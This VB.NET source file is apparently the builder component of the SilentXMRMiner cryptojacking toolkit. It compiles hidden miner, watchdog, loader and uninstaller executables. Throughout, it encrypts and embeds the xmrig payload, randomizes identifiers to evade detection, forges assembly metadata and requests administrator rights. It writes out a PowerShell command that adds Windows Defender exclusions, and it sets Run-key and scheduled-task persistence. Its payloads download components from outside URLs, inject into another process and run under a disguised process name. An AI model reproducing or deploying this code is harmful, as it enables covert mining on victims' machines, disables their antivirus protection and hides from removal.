Imports System.CodeDom.Compiler
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports Microsoft.CSharp

Public Class Codedom
    Public Shared MinerOK As Boolean = False
    Public Shared WatchdogOK As Boolean = False
    Public Shared LoaderOK As Boolean = False
    Public Shared UninstallerOK As Boolean = False
    Public Shared F As Form1

    Public Shared Sub MinerCompiler(ByVal Path As String, ByVal Code As String, ByVal Res As String)
        MinerOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 /optimize "

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Core.dll")
            .ReferencedAssemblies.Add("System.Management.dll")
            .ReferencedAssemblies.Add("System.IO.Compression.dll")
            .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")

            F.txtLog.Text = F.txtLog.Text + ("Creating resources..." + vbNewLine)

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                If Not F.FA.toggleDownloader.Checked Then
                    R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
                End If
                R.AddResource(F.Resources_winring, F.AES_Encryptor(My.Resources.WinRing0x64))
                If F.chkInstall.Checked And F.toggleWatchdog.Checked Then
                    R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata))
                End If
                If F.toggleEnableGPU.Checked And Not F.FA.toggleDownloader.Checked Then
                    R.AddResource(F.Resources_libs, F.AES_Encryptor(My.Resources.libs))
                End If
                R.Generate()
            End Using

            F.txtLog.Text = F.txtLog.Text + ("Embedding resources..." + vbNewLine)
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Res + ".Resources")

            Dim minerbuilder As New StringBuilder(Code)

            ReplaceGlobals(minerbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, minerbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                Next
                MinerOK = False
            Else
                MinerOK = True
            End If
        End With

    End Sub

    Public Shared Sub WatchdogCompiler(ByVal Path As String, ByVal Code As String, Optional RequireAdministrator As Boolean = False)
        WatchdogOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 /optimize "

        If RequireAdministrator Then
            File.WriteAllBytes(Path & ".manifest", My.Resources.administrator)
            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
            OP += " /win32manifest:""" + Path & ".manifest" + """"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Management.dll")

            Dim watchdogbuilder As New StringBuilder(Code)

            ReplaceGlobals(watchdogbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, watchdogbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                Next
                WatchdogOK = False
            Else
                WatchdogOK = True
            End If

            If RequireAdministrator Then
                File.Delete(Path & ".manifest")
            End If
        End With

    End Sub

    Public Shared Sub LoaderCompiler(ByVal SavePath As String, ByVal ProgramBytes As Byte(), Optional ICOPath As String = "", Optional RequireAdministrator As Boolean = False)
        LoaderOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 /optimize "

        If RequireAdministrator Then
            File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
            OP += " /win32manifest:""" + SavePath & ".manifest" + """"
        End If

        If F.chkIcon.Checked And Not String.IsNullOrEmpty(ICOPath) Then
            F.txtLog.Text = F.txtLog.Text + ("Adding Icon..." + vbNewLine)
            OP += " /win32icon:""" + ICOPath + """"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = SavePath
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Core.dll")
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If

            F.txtLog.Text = F.txtLog.Text + ("Creating Loader resources..." + vbNewLine)

            Dim rand As New Random()
            Dim Resources_Program = F.Randomi(rand.Next(5, 40))
            Dim Resources_Loader = F.Randomi(rand.Next(5, 40))

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")
                R.AddResource(Resources_Program, F.AES_Encryptor(ProgramBytes))
                R.Generate()
            End Using

            F.txtLog.Text = F.txtLog.Text + ("Embedding Loader resources..." + vbNewLine)
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")

            Dim loaderbuilder As New StringBuilder(My.Resources.Loader)

            loaderbuilder.Replace("#Program", Resources_Program)
            loaderbuilder.Replace("#LoaderRes", Resources_Loader)

            ReplaceGlobals(loaderbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, loaderbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                Next
                LoaderOK = False
            Else
                LoaderOK = True
            End If

            If RequireAdministrator Then
                File.Delete(SavePath & ".manifest")
            End If
            Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
        End With

    End Sub

    Public Shared Sub UninstallerCompiler(ByVal SavePath As String)
        UninstallerOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 /optimize "

        If F.FA.toggleAdministrator.Checked Then
            File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
            OP += " /win32manifest:""" + SavePath & ".manifest" + """"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = SavePath
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Core.dll")
            .ReferencedAssemblies.Add("System.Management.dll")
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If

            F.txtLog.Text = F.txtLog.Text + ("Creating Uninstaller..." + vbNewLine)

            Dim uninstallerbuilder As New StringBuilder(My.Resources.Uninstaller)

            ReplaceGlobals(uninstallerbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, uninstallerbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                Next
                UninstallerOK = False
            Else
                UninstallerOK = True
            End If

            If F.FA.toggleAdministrator.Checked Then
                File.Delete(SavePath & ".manifest")
            End If
        End With
    End Sub

    Public Shared Sub ReplaceGlobals(ByRef stringb As StringBuilder)
        If F.FA.toggleKillWD.Checked Then
            stringb.Replace("DefKillWD", "true")
            stringb.Replace("#KillWDCommands", F.EncryptString("/c powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%' & exit"))
        End If

        If F.FA.toggleEnableDebug.Checked Then
            stringb.Replace("DefDebug", "true")
        End If

        If F.FA.toggleDownloader.Checked Then
            stringb.Replace("DefDownloader", "true")
        End If

        If F.toggleEnableGPU.Checked Then
            stringb.Replace("DefGPU", "true")
        End If

        If F.chkInstall.Checked Then
            stringb.Replace("DefInstall", "true")

            Dim installdir As String

            Select Case F.txtInstallPathMain.Text
                Case "AppData"
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
                Case "UserProfile"
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)"
                Case "Temp"
                    installdir = "Path.GetTempPath()"
                Case Else
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
            End Select

            If F.FA.toggleInstallSystem32.Checked Then
                stringb.Replace("DefSystem32", "true")
                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & "), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
            Else
                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & ", Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
            End If


            If F.toggleWatchdog.Checked Then
                stringb.Replace("DefWatchdog", "true")
            End If
        End If

        If F.chkAssembly.Checked Then
            stringb.Replace("DefAssembly", "true")

            stringb.Replace("%Title%", F.txtTitle.Text)
            stringb.Replace("%Description%", F.txtDescription.Text)
            stringb.Replace("%Company%", F.txtCompany.Text)
            stringb.Replace("%Product%", F.txtProduct.Text)
            stringb.Replace("%Copyright%", F.txtCopyright.Text)
            stringb.Replace("%Trademark%", F.txtTrademark.Text)
            stringb.Replace("%v1%", F.num_Assembly1.Text)
            stringb.Replace("%v2%", F.num_Assembly2.Text)
            stringb.Replace("%v3%", F.num_Assembly3.Text)
            stringb.Replace("%v4%", F.num_Assembly4.Text)
        End If

        stringb.Replace("%Guid%", Guid.NewGuid.ToString)

        stringb.Replace("#KEY", F.AESKEY)
        stringb.Replace("#SALT", F.SALT)
        stringb.Replace("#IV", F.IV)
        stringb.Replace("#DLLSTR", F.EncryptString("Mandark.Mandark"))
        stringb.Replace("#DLLOAD", F.EncryptString("Load"))
        stringb.Replace("#REGKEY", F.EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
        stringb.Replace("#SANCTAMLIBSURL", F.EncryptString("https://sanctam.net:58899/assets/txt/resource_url.php?type=libs"))
        stringb.Replace("#SANCTAMMINERURL", F.EncryptString("https://sanctam.net:58899/assets/txt/resource_url.php?type=xmrig"))
        stringb.Replace("#LIBSURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/libs.zip"))
        stringb.Replace("#MINERURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/xmrig.zip"))
        stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
        stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"))
        stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn "))
        stringb.Replace("#MINERID", F.EncryptString("--cinit-find-x"))
        stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
        stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))

        stringb.Replace("RInstall", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RGetTheResource", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RGetString", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RRun", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RBaseFolder", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RCheckProc", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RInitialize", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RGetGPU", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RAES_Method", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RTruncate", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RCommandLineEncrypt", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RWDLoop", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RStart", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RLoader", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RUninstaller", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("RProgram", F.Randomi(F.rand.Next(5, 40)))

        stringb.Replace("rarg1", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg2", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg3", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg4", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg5", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg6", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg7", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg8", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg9", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg10", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rarg11", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rbD", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rbD2", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rplp", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rxM", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("rcheckcount", F.Randomi(F.rand.Next(5, 40)))
        stringb.Replace("startDelay", F.txtStartDelay.Text)
    End Sub
End Class
